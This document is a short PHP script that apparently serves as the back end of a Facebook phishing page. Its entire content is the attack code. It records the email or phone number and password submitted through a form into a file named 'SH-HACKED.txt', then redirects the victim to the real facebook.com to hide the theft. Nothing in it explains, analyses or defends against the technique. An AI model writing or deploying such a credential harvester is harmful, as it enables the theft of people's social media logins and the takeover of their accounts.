<?php
 
file_put_contents("SH-HACKED.txt", "email/number " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/');
exit();
 